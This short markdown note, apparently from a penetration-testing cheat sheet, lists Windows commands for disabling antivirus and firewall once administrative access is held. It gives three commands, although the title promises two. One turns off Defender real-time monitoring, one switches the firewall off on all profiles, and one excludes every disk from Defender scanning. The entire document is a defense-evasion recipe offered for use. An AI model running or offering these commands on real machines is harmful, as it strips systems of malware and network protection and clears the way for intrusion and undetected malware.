## Disable AV and Firewall with 2 commands

### Requirements: Administrative/System level access

#### 1) Set-MpPreference -DisableRealtimeMonitoring $True

#### 2) netsh advfirewall set allprofiles state off

#### 3) powershell  -c foreach ($disk in Get-WmiObject Win32_Logicaldisk){Add-MpPreference -ExclusionPath $disk.deviceid}
